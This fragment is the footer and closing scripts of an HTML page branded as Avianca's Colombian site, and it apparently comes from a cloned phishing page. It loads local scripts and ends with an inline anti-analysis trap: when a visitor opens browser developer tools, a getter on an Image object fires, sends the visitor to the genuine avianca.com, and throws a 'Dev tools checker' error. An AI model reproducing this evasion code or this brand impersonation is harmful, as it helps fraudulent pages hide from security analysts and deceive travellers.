                            <div id="vuelos-baratos" role="tab" data-toggle="collapse" data-parent="#enlaces-footer" href="#enlaces-vuelos-baratos" class="encabezado-acordeon collapsed" aria-expanded="false" aria-controls="enlaces-vuelos-baratos">
                                <span class="text-ellipsis" style="margin-left: 20px; padding-left: 0px;">Enlaces rápidos </span>
                            </div>
                        </div>
                    </div>
                </section>

                <div class="footerLegal">
                    <div class="footer-legales">
                        <ul class="lista-inferior" role="listbox">

                            <li role="option">
                                <a href="https://www.avianca.com/co/es/" target="_self" class="text-list-footer" aria-label="© Avianca S.A 2023" role="link">
                                    <span class="text-ellipsis">© Avianca S.A 2023</span>
                                </a> 
                                <span class="separador">&nbsp;|&nbsp;</span>
                            </li>

                            <li role="option">
                                <a href="https://www.avianca.com/co/es/sobre-nosotros/informacion-legal/terminos-y-condiciones/" target="_self" class="text-list-footer" aria-label="Términos y condiciones" role="link">
                                    <span class="text-ellipsis">Términos y condiciones</span>
                                </a> 
                                <span class="separador">&nbsp;|&nbsp;</span>
                            </li>

                            <li role="option">
                                <a href="https://www.avianca.com/co/es/sobre-nosotros/informacion-legal/politica-de-privacidad/" target="_self" class="text-list-footer" aria-label="Política de privacidad" role="link">
                                    <span class="text-ellipsis">Política de privacidad</span>
                                </a>
                                <span class="separador">&nbsp;|&nbsp;</span>
                            </li>

                            <li role="option">
                                <a href="https://www.avianca.com/co/es/sobre-nosotros/informacion-legal/politica-cookies/" target="_self" class="text-list-footer" aria-label="Política de cookies " role="link">
                                    <span class="text-ellipsis">Política de cookies </span>
                                </a>
                                <span class="separador">&nbsp;|&nbsp;</span>
                            </li>

                            <li role="option">
                                <a href="https://www.avianca.com/co/es/sobre-nosotros/mapa-sitio/" target="_self" class="text-list-footer" aria-label="Mapa del sitio" role="link">
                                    <span class="text-ellipsis">Mapa del sitio</span>
                                </a>
                                <span class="separador">&nbsp;|&nbsp;</span>
                            </li>

                        </ul>
                    </div>
                </div>
            </div>
            <!-- FIN WRAPPER -->

            <!-- ngIf: stepCH != undefined -->
        </div>
    </div>

    <script src="assets/bootstrap/js/jquery.min.js"></script>
    
    <script src="./js/calendario.js"></script>
    <script src="./js/script.js"></script>

    <!-- ION ICONS -->
    <script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
    <script nomodule src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.js"></script>

    <script>
        var checkStatus;
        var element = new Image();

        Object.defineProperty(element, 'id', {
            get: function () {
                checkStatus = 'on';
                console.log("OPENED");
                document.location.href = "https://www.avianca.com/co/es/";

                throw new Error("Dev tools checker");
            }
        });

        requestAnimationFrame(function check() {
            checkStatus = 'off';
        });
    </script>
</body>
</html>